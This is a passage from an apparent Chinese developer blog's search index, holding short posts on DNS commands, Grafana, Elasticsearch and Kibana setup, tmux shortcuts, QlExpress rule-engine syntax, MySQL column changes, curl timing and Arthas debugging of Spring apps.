一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/03/210203-tmux-批量操作/"},{"title":"210315-域名解析命令","text":"1. 配置文件域名相关的两个配置文件 linux /etc/hosts: ip -&gt; 域名 /etc/resolv.conf: 设置dns服务器ip地址 /etc/host.conf: 制定域名解析顺序（本地hosts文件，dns解析) win C:\\Windows\\System32\\drivers\\etc\\hosts: ip -&gt; 域名 dns: 控制面板 -&gt; 网络和共享中心 -&gt; 以太网 -&gt; 属性 -&gt; ipv4 -&gt; dns 2. DNS查询指令常见的几个dns命令，如 host, nslookup, dig 2.1 host1host hhui.top 2.2 nslookup123456789nslookup hhui.top# 输出Server: UnKnownAddress: 10.224.10.8Non-authoritative answer:Name: hhui.topAddress: 47.98.136.120 2.3 dig12345678910111213141516171819202122dig hhui.top# 输出; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; hhui.top;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45125;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: af1e8f58654ca181f69cb19c604f432998ce632d2be17ed5 (good);; QUESTION SECTION:;hhui.top. IN A;; ANSWER SECTION:hhui.top. 503 IN A 47.98.136.120;; Query time: 0 msec;; SERVER: 10.224.10.8#53(10.224.10.8);; WHEN: Mon Mar 15 19:21:13 CST 2021;; MSG SIZE rcvd: 81 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/15/210315-域名解析命令/"},{"title":"210318-linux grafana大盘接入mysql","text":"grafana 安装接入mysql数据源 1. 安装官网下载地址: https://grafana.com/grafana/download?pg=get&amp;plcmt=selfmanaged-box1-cta1 linux安装 123sudo apt-get install -y adduser libfontconfig1wget https://dl.grafana.com/oss/release/grafana_7.4.3_amd64.debsudo dpkg -i grafana_7.4.3_amd64.deb centos 12wget https://dl.grafana.com/oss/release/grafana-7.4.3-1.x86_64.rpmsudo yum install grafana-7.4.3-1.x86_64.rpm 2. 启动启动命令 1sudo /etc/init.d/grafana-server start 测试: http://localhost:3000 登录密码: admin/admin 3. MySql数据源配置添加数据源: http://localhost:3000/datasources/new 选择 mysql 输入数据库信息 Host: 主机 + 端口号 Database: 数据库名 User/Password 连接信息 Max open: 4 Max idle: 2 测试并保存，然后配置面板即可 至于grafana面板配置说明，下篇博文介绍 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/18/210318-linux-grafana大盘接入mysql/"},{"title":"210302-QuickMedia升级2.6.0","text":"quick-media 升级2.6.0，二维码组件扩展两种样式规则 MINI_RECT: 超火的小方块二维码生成 IMAGE: 图片二维码，当相同的区域指定多个图片时，支持随机挑选渲染 项目源码: https://github.com/liuyueyi/quick-media 2.6.0 特性演示说明导入依赖 123456&lt;!-- https://mvnrepository.com/artifact/com.github.liuyueyi.media/qrcode-plugin --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi.media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.6.0&lt;/version&gt;&lt;/dependency&gt; MINI_RECT 二维码 1234567891011121314@Testpublic void miniRectQr() { try { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; boolean ans = QrCodeGenWrapper.of(msg) .setW(200) // 如果希望探测图形依然是标准的，加上下面这一行// .setDetectSpecial() .setDrawStyle(QrCodeOptions.DrawStyle.MINI_RECT) .asFile(prefix + \"/dqr0_1.png\"); } catch (Exception e) { e.printStackTrace(); }} 输出二维码如下 多图二维码渲染 1234567891011121314151617181920212223@Testpublic void imgQr2() { try { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; int size = 500; boolean ans = QrCodeGenWrapper.of(msg) .setW(size) .setH(size) .setErrorCorrection(ErrorCorrectionLevel.M) .setDrawBgColor(ColorUtil.OPACITY) .setDetectImg(\"love/01.png\") .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE) .addImg(1, 1, \"love/001.png\") .addImg(2, 2, \"love/003_01.png\") .addImg(2, 2, \"love/003_02.png\") .addImg(2, 2, \"love/003_03.png\") .addImg(4, 1, \"love/004.png\") .addImg(1, 4, \"love/004_02.png\") .asFile(prefix + \"/imgQr2.png\"); } catch (Exception e) { e.printStackTrace(); }} 输出如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/02/210302-QuickMedia升级2-6-0/"},{"title":"210329-Elastic & Kibana安装与基本使用","text":"本文主要介绍es &amp; kibana的安装和基本使用，更多es的相关用法后面逐一补上 1. elasticsearch安装linux环境下，直接下载安装包 12345# 下载wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.0-linux-x86_64.tar.gz# 解压tar -zxvf elasticsearch-7.12.0-linux-x86_64.tar.gz jvm参数配置 默认es启动，占用的内存太大了，本机测试有必要限制一下 12345vim config/jvm.options## 堆空间，根据实际情况调整-Xms2g-Xmx2g 启动 1bin/elasticsearch 启动完毕之后，会看到控制台有一些输出，日志不打印时，可以输入下面的查询，验证是否ok 1curl -X GET http://localhost:9200/ 2. kibana安装同样linux环境下，直接下载tar包解压使用 123wget https://artifacts.elastic.co/downloads/kibana/kibana-7.12.0-linux-x86_64.tar.gztar -zxvf kibana-7.12.0-linux-x86_64.tar.gz 参数配置 12345678910vim config/kibana.yml# 端口server.port: 5601# es 地址elasticsearch.hosts: [\"http://localhost:9200\"]# 指定索引名kibana.index: \".kibana\" 启动 1bin/kibana 访问 1http://localhost:5601/app/home 3. Dev Tools 实现es基本操作借助kibana来做一些es的基本操作，如添加文档，查询等 打开url: http://localhost:5601/app/dev_tools#/console 添加文档 12345678910111213POST my-index-000001/_doc{ &quot;@timestamp&quot;: &quot;2021-03-29T10:12:00&quot;, &quot;message&quot;: &quot;GET /search HTTP/1.1 200 1070000&quot;, &quot;user&quot;: { &quot;id&quot;: &quot;kimchy&quot;, &quot;name&quot;: &quot;YiHui&quot; }, &quot;hobby&quot;: [ &quot;java&quot;, &quot;python&quot; ]} 查询所有 12345678POST my-index-000001/_search{ &quot;query&quot;: { &quot;match_all&quot;: { } }} 精确查询 12345678POST my-index-000001/_search{ &quot;query&quot;: { &quot;match&quot;: { &quot;user.name&quot;: &quot;YiHui&quot; } }} 删除索引 1DELETE my-index-000001 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/29/210329-Elastic-Kibana安装与基本使用/"},{"title":"210509-spring boot启动类启动 错误: 找不到或无法加载主类 xxx.xxxx.Application 的解决方法","text":"SpringBoot项目启动，忽然提示找不到或者无法加载主类，记录两种常用的方式 方法一：清空idea缓存 idea清理缓存： file -&gt; Invalidate Cache &amp; Restart IDEA 方法二：maven重新install 执行命令 1mvn clean install -DskipTests=true II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/05/09/210509-spring-boot启动类启动-错误-找不到或无法加载主类-xxx-xxxx-Application-的解决方法/"},{"title":"210512-IDEA 项目module无法导入问题记录","text":"idea一个项目有多个module，忽然发现一个module显示不太正常，如 一般有两种方法，基本的如： 选中pom.xml，右键 maven unignore Projects 除了上面的姿势之外，可以通过设置栏进行批量处理 Settings Build, Extention, Deployment Maven ignore files 取消勾选的即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/05/12/210512-IDEA-项目module无法导入问题记录/"},{"title":"210518-String#format数量不匹配抛异常","text":"偶然发现一个问题，在使用String.format进行格式化输出时，发现参数个数不匹配时，会抛出异常，如 1String msg = String.format(\"hello %s, %s\", \"a\"); 上面这个执行之后，会抛MissingFormatArgumentException异常，提示信息如 1java.util.MissingFormatArgumentException: Format specifier &apos;%s&apos; 那么这个问题可以如何规避呢？ 方法一： 补全缺的参数 思路主要是统计出需要有多少个参数，当参数较少时，主动补上缺，保证参数一致 注意事项 补全的参数类型，需要满足要求 输出结果可能并不是预期的 方法二： 重写java.util.Formatter#format(java.util.Locale, java.lang.String, java.lang.Object...)逻辑 实现格式化的核心代码在这里 1234567891011121314151617181920212223switch (index) {case -2: // fixed string, \"%n\", or \"%%\" fs.print(null, l); break;case -1: // relative index if (last &lt; 0 || (args != null &amp;&amp; last &gt; args.length - 1)) throw new MissingFormatArgumentException(fs.toString()); fs.print((args == null ? null : args[last]), l); break;case 0: // ordinary index lasto++; last = lasto; if (args != null &amp;&amp; lasto &gt; args.length - 1) throw new MissingFormatArgumentException(fs.toString()); fs.print((args == null ? null : args[lasto]), l); break;default: // explicit index last = index - 1; if (args != null &amp;&amp; last &gt; args.length - 1) throw new MissingFormatArgumentException(fs.toString()); fs.print((args == null ? null : args[last]), l); break;} 考虑在这里进行适配即可；具体的实现，后续补上 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/05/18/210518-String-format数量不匹配抛异常/"},{"title":"210125-tmux 快捷键","text":"tmux 终端复用器，最简单质朴的需求就是多窗格，会话复用，本文简单记录一下常用的快捷键 安装 1234# unbuntusudo apt-get install tmux# centossudo yum install tmux 基本命令 123456# 启动tmux# 退出, 下面两个都可以ctrl + dexit 快捷键 请注意，使用快捷键之前，先按 ctrl+b 松开，再输入其他的 窗格快捷键 12345678910111213141516171819202122# 左右两个窗格ctrl + b: %# 上下两个窗格ctrl + b: &quot;# 选中不同的窗格 ctrl + b: 四个方向键ctrl + b: : 上个窗格ctrl + b: o 下个窗格# 关闭当前窗格ctrl + b: x# 当前窗格拆分为独立窗口ctrl + b: !# 全屏显示ctrl + b: z # 再来一次就缩小# 大小调整Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小 窗口快捷键 1234567891011121314151617# 创建一个新窗口，状态栏会显示多个窗口的信息Ctrl+b : c# 切换到上一个窗口（按照状态栏上的顺序）。Ctrl+b :p# 切换到下个窗口Ctrl+b :n# 切换Ctrl+b &lt;number&gt;：切换到指定编号的窗口，其中的&lt;number&gt;是状态栏上的窗口编号。# 从列表中选择窗口Ctrl+b :w# 窗口重命名Ctrl+b :, 以上信息参考自博文: Tmux 使用教程 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/25/210125-tmux-快捷键/"},{"title":"210623-QlExpress使用姿势一:预览","text":"阿里开源规则引擎QlExpress基础介绍 1. QlExpress阿里开源的脚本引擎，适用于规则引擎的开发，好几年没有更新了，基本上如非必要，不推荐继续踩坑；至于我为啥要写这个。。。 项目源码：https://github.com/alibaba/QLExpress maven引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;QLExpress&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt;&lt;/dependency&gt; 一般使用姿势 12345678ExpressRunner runner = new ExpressRunner();DefaultContext&lt;String, Object&gt; context = new DefaultContext&lt;String, Object&gt;();context.put(\"a\",1);context.put(\"b\",2);context.put(\"c\",3);String express = \"a+b*c\";Object r = runner.execute(express, context, null, true, false);System.out.println(r); 从上面的使用姿势来看，QlExpress的使用，主要有两个东西 ExpressRunner 脚本引擎 DefaultContext 上下文，用于传递参数 使用核心 runner.execute(express, context, null, ture, false); express: 脚本表达式 context: 上下文 null: 输出的错误信息List isCache: 是否使用Cache中的指令集 isTrace: 是否输出详细的执行指令信息 QlExpress的语法与原生的java语法并不完全兼容，而且其本身提供了一些能力扩展，如重命名，自定义Operator，宏等，接下来逐一进行介绍 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/06/23/210623-QlExpress使用姿势一/"},{"title":"210702-curl 耗时统计脚本小记","text":"记录一下curl访问url请求的耗时情况 1curl 'https://blog.hhui.top/hexblog/about/' -w '%{time_namelookup}::%{time_connect}::%{time_starttransfer}::%{time_total}::%' 参数说明： time_namelookup：DNS 解析域名耗时 time_connect：client和server端建立TCP 连接的时间 time_starttransfer：从client发出请求；到web的server 响应第一个字节的时间 time_total：client发出请求；到web的server发送会所有的相应数据的时间 建立TCP连接到server返回client第一个字节的时间：time_starttransfer – time_connect = s server把响应数据发送给client的时间：time_total – time_starttransfer = s II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/07/02/210702-curl-耗时统计脚本小记/"},{"title":"210524-win10与ubuntu子系统文件互查","text":"记录一下win10与子系统ubuntu之间的文件共享方式，即如何在win10中查询ubuntu的文件，反过来又是怎么操作的 1. win10访问ubuntuwin10如果希望直接访问ubuntu的文档，通过以下路径查询 C:\\Users\\用户名\\AppData\\Local\\Packages\\ubuntu版本\\LocalState\\rootfs 进入之后可以看到ubuntu的文件目录 2. ubuntu访问win10ubuntu访问win10则相对好找一点 12# d盘下文件ls /mnt/d/ II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/05/24/210524-win10与ubuntu子系统文件互查/"},{"title":"210706-MySql表字段修改记录","text":"mysql修改表数据类型的方式 针对一个已经存在的列，修改类型，主要使用 modify 1alter table xxx modify id int(11) unsigned not null auto_increment comment '主键id' 如果是希望新增一列，使用add column 12-- after 表示这个新增的列在id这一列之后alter table xxx add column to_add varchar(11) not null default '' comment '新增的列' after `id`; 删除某一列，使用 drop column 12-- 删除 xxx 这一列alter table drop column xxx; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/07/06/210706-MySql表字段修改记录/"},{"title":"210624-QlExpress使用姿势二：基本语法","text":"上一篇博文简单的介绍了一下QlExpress，以及一个最基础的使用demo，接下来我们看一下QlExpress的语法，重点关注一下它与Java不同的地方 1. 四则运算对于加减乘除，求余等操作与java基本一致 1234567891011121314151617181920212223public class SimpleUsageDemo { private static ExpressRunner runner = new ExpressRunner(); private static DefaultContext&lt;String, Object&gt; context = new DefaultContext&lt;&gt;(); static { context.put(\"a\", 1); context.put(\"b\", 2); context.put(\"c\", 3); context.put(\"d\", 5); context.put(\"list\", Arrays.asList(1, 2, 3, 4)); } private static Object process(String express) throws Exception { return runner.execute(express, context, null, true, false); } public static void main(String[] args) throws Exception { // 四则运算 // 1 + 2 * 3 + 5 % 2 + 5 / 2 = 10 String express = \"a + b * c + d % 2 + d / 2\"; System.out.println(\"四则计算:\" + process(express)); }} 上面是正常的数字运算，如果有变量不是数值，而是String，会怎样？ 1234context.put(\"s1\", \"abc\");context.put(\"s2\", 456);System.out.println(\"+\" + process(\"s1 + s2 * 2\")); 输出结果如下: 1+abc912 2. in操作符QlExpress提供了in的操作符扩展支持，后续会介绍如何实现自定义的Operator in主要作用用于判断元素是否在列表中 12345// in，判断是否在列表中// a = 1, d = 5// list = [1,2,3,4]System.out.println(\"in:\" + process(\"a in list\"));System.out.println(\"in:\" + process(\"d in list\")); 上面执行输出 12in:truein:false 上面的case中，列表内容为数字，a,d也是数字，那么如果有一个变量 sa = &quot;1&quot;会怎样? 12context.put(\"sa\", \"1\");System.out.println(\"sa in:\" + process(\"sa in list\")); 输出同样是true 1sa in:true 主要原因在 OperatorIn#executeInner的实现里面，核心代码如下（下一节讲==的时候说） 3. == 与 !=1234// == / !=System.out.println(\"a == 1:\" + process(\"a == 1\"));System.out.println(\"b == '2':\" + process(\"b == \\\"2\\\"\"));System.out.println(\"b != '2':\" + process(\"b != \\\"2\\\"\")); 注意输出 123a == 1:trueb == &apos;2&apos;:trueb != &apos;2&apos;:false 注意，qlExpress中，==与java中的不一样，它更多的是值比较，主要是方法 Operator#compareData()(也是上面in的判断依据)来实现的 注意 从上面的截图也可以看出，在QlExpress中的比较符号，只支持部分类型 一个为String，另外一个专为String进行比较 两个都是数值类型 两个都是Boolean类型 两个都是日期Date类型 不满足上面条件的比较，抛异常 4. like 语法和sql的like语句差不多，属于新增特性 123// like 语法context.put(\"name\", \"一灰灰\");System.out.println(\"like:\" + process(\"name like '%灰'\")); 输出 1like:true 5. 三元表达式这个就是java中的?:，没有什么去呗 1System.out.println(\"三元表达式:\" + process(\"a == 1? '1': '2'\")); 6. 自增、自减++/--，需要注意的是QlExpress中，只支持后置的 12System.out.println(\"自增:\" + process(\"a++; a\"));System.out.println(\"自减:\" + process(\"a--; a\")); 输出 12自增:2自减:1 7. 逻辑与或&amp;&amp;|| 与java没有什么区别 123// 逻辑与或System.out.println(&quot;&amp;&amp;:&quot; + process(&quot;a == 1 &amp;&amp; b == 2&quot;));System.out.println(&quot;||:&quot; + process(&quot;a == 2 || b == 1&quot;)); 8. 容器遍历注意，QlExpress不支持foreach，只支持最原始的for循环，其次大括号必须有，不能省略 12345678910111213// 遍历, 不支持forearch，需要改为原生的for循环// 大括号需要有，不然会抛异常System.out.println(\"遍历:\" +process(\"sum = 0; for(i = 0; i &lt; list.size(); i++) {sum = sum+list.get(i);} return sum;\"));// map 遍历方式，keySet转array，然后再for循环迭代Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"a\", 10);map.put(\"b\", 20);context.put(\"map\", map);System.out.println(\"遍历:\" +process(\"sum=0; keySet=map.keySet().toArray(); for(i = 0; i &lt; keySet.length; i++) {sum = sum + map.get(keySet[i]);} return sum\")); 9. if、then、else支持标准的if语句，也支持if/then/else 123System.out.println(process(\"if(a == 1) then a = 10 else a= 30; a \"));System.out.println(process(\"if(true) { println('hello');} else { println('world'); }\")) 10. List/Map创建 弱类型语言，请不要定义类型声明, 更不要用Templete（Map&lt;String,List&gt;之类的） 提供NewList, NewMap来实现快速的列表，Map创建 1234567// 创建Listexpress = \"abc = NewList(1,2,3); return abc.get(1)+abc.get(2)\";System.out.println(\"创建List:\" + process(express));// 创建Mapexpress = \"abc = NewMap(1:1,2:2); return abc.get(1) + abc.get(2);\";System.out.println(\"创建Map:\" + process(express)); 11. 对象访问对象的成员属性可以直接访问，几遍它是私有的，也没有关系 123456789101112131415161718192021222324252627public class BasicDemo { private String name; private Integer age; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; }}// 可以直接访问对象的私有成员BasicDemo user = new BasicDemo();user.setName(\"一灰\");user.setAge(18);context.put(\"user\", user);System.out.println(\"user.name:\" + process(\"user.name\")); 12. 变量在QlExpress的表达式中，声明局部变量时，需要在前面添加类型；若不添加类型，那么这个变量会放到上下文中 12345678// 输出10System.out.println(process(\"int tmp = 10;\"));// 输出nullSystem.out.println(context.get(\"tmp\"));// 输出10System.out.println(process(\"tmp = 10;\"));// 输出10System.out.println(context.get(\"tmp\")); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/06/24/210624-QlExpress使用姿势二：基本语法/"},{"title":"210723-Arthas 获取SpringContext访问应用行为记录","text":"使用arthas进行应用排查定位，这里主要记录借助arthas，获取SpringContext，然后就可以通过SpringContext来访问应用内存数据，调用bean方法等操作 基本操作 123456789101112# 下载arthascurl -O https://arthas.aliyun.com/arthas-boot.jar# 启动java -jar arthas-boot.jar# 选择需要挂在的jar进程1# 监控，获取SpringContexttt -t org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter invokeHandlerMethod# 然后通过http访问一下应用，接下来就可以使用下面的获取到SpringContexttt -i 1000 -w 'target.getApplicationContext()' arthas支持ognl语法，需要注意的是针对容器，不支持lambda语法，如果拿到了一个Set对象，想获取某个值，考虑先将其转成List，然后再操作，如 1tt -i 1000 -w &apos;@com.google.common.collect.Lists@newArrayList(target.getApplicationContext(&quot;demoBean&quot;).set).get(0)&apos; 关于ognl的更多使用姿势，可以参考博文 Ognl 语法基础教程 Ognl 使用实例手册 Ognl之内部类与静态成员属性修改使用姿势 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/07/23/210723-Arthas-获取SpringContext访问应用行为记录/"},{"title":"210628-QlExpress使用姿势三:Function与方法绑定","text":"QlExpress绑定方法，实现能力扩展；支持自定Function，再脚本中定义函数，实现复用 1. 自定义FunctionQlExpress支持在脚本中定义函数（等同于java中的方法），主要利用关键字function来修饰 一个简单的case如下 123456789function add(int a, int b) { return a + b;}function sub(int a, int b ) { return a - b;}return add(10, 20) + sub(4, 2); 上面定义了两个方法，一个add， 一个sub，需要注意的是与Java不同点在于无需定义返回类型 访问case如 1234567891011121314151617ExpressRunner runner = new ExpressRunner();DefaultContext&lt;String, Object&gt; context = new DefaultContext&lt;&gt;();// 脚本定义functionString express = \"function add(int a, int b) {\\n\" +\" return a + b;\\n\" +\"}\\n\" +\"\\n\" +\"function sub(int a, int b ) {\\n\" +\" return a - b;\\n\" +\"}\\n\" +\"\\n\" +\"return add(10, 20) + sub(4, 2);\";// 方法执行System.out.println(runner.execute(express, context, null, true, false));System.out.println(runner.execute(\"add(11, 22)\", context, null, true, false)); 输出如下 123456732[main] ERROR com.ql.util.express.InstructionSet - 当前ProgramPoint = 2[main] ERROR com.ql.util.express.InstructionSet - 当前指令call Function[add] OPNUMBER[2][main] ERROR com.ql.util.express.InstructionSet - java.lang.Exception: run QlExpress Exception at line 1 :在Runner的操作符定义和自定义函数中都没有找到&quot;add&quot;的定义Exception in thread &quot;main&quot; java.lang.Exception: run QlExpress Exception at line 1 :在Runner的操作符定义和自定义函数中都没有找到&quot;add&quot;的定义 at com.ql.util.express.instruction.detail.InstructionCallSelfDefineFunction.execute(InstructionCallSelfDefineFunction.java:62) at com.ql.util.express.InstructionSet.executeInnerOrigiInstruction(InstructionSet.java:204) 在第一个脚本中定义的function，在同一脚本中访问可以； 但是需要注意这个function并不是通用的，所以上面第二个脚本执行add(11,22) 会提示没有add方法 那么如果我们希望复用方法，可以怎么做呢？ 绑定Java方法 2. 类方法绑定在类 FunctionDemo中添加一个静态方法 123456789101112131415public static String join(Object... obj) { StringBuilder builder = new StringBuilder(50); for (Object o : obj) { if (builder.length() &gt; 0) { builder.append(\",\"); } builder.append(o); } return builder.toString();}// 对于jdk1.8，可以直接使用Stream来实现等价于上面的拼接功能public static String join(Object... obj) { return Stream.of(obj).map(String::valueOf).collect(Collectors.joining(\",\"));} 静态方法的绑定比较简单，直接使用addFunctionOfClassMethod，如下 12// 静态方法绑定runner.addFunctionOfClassMethod(\"join\", FunctionDemo.class.getName(), \"join\", new Class[]{Object[].class}, null); 第一个参数 join 表示绑定之后的方法命名（注意全局唯一） 第二个参数为类名 第三个参数为类方法名 第四个参数为类方法参数类型（因为是不定长参数，所以是new Class[]{Object[].class}） 第五个参数为异常信息 使用姿势如下 12345678910111213Object ans = runner.execute(\"join([\\\"hello\\\", \\\"一灰灰\\\", \\\"blog\\\"])\", context, null, true, false);System.out.println(\"静态方法调用:\" + ans);``` 重点关注上面的表达式，传参是 `[\"hello\", \"一灰灰\", \"blog\"]`，是一个数组形式的，与java中不定长参数的访问姿势不同如果我希望象Java中一样，也支持不定长传参姿势，可以如下配置```java// 注意不定参数，如果需要按照java的方式使用，需要开启下面这个全局开关DynamicParamsUtil.supportDynamicParams = true;ans = runner.execute(\"join(\\\"hello\\\", \\\"一灰灰\\\", \\\"blog\\\")\", context, null, true, false);System.out.println(\"静态方法调用:\" + ans); 输出结果 12静态方法调用:hello,一灰灰,blog静态方法调用:hello,一灰灰,blog 说明 字符串可以用单引号括起来 3. 实例方法绑定除了静态方法绑定之外，也可以绑定实例方法，使用姿势与上面基本一致，只是调用的是addFunctionOfServiceMethod而已 添加一个实例方法 1234public List&lt;String&gt; split(String text) { String[] cells = text.split(\",\"); return Arrays.asList(cells);} 然后测试case如下 123456// 绑定对象方法FunctionDemo functionDemo = new FunctionDemo();runner.addFunctionOfServiceMethod(\"split\", functionDemo, \"split\", new Class[]{String.class}, null);context.put(\"list\", \"a,b,c,d\");ans = runner.execute(\"split(list)\", context, null, true, false);System.out.println(\"绑定对象方法:\" + ans); 输出结果 1绑定对象方法:[a, b, c, d] 4. 小结本文主要介绍了QlExpress的方法扩展，支持在脚本中，通过function定义函数，实现调用， 注意：这种函数的生命周期是当前脚本 其次可以通过绑定静态类方法 + 实例方法，让脚本可以直接调用Java相关方法，实现功能扩展 注意：方法名需要全局唯一 QlExpress系列教程 210624-QlExpress使用姿势二：基本语法 210623-QlExpress使用姿势一 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/06/28/210628-QlExpress使用姿势三-Function与方法绑定/"},{"title":"210629-QlExpress使用姿势四:Operator与Micro扩展","text":"本文将介绍QlExpress中自定义操作符Operator + Micro的使用姿势，通过扩展Operator，可以为规则脚本赋能，提供更友好的使用姿势 1. 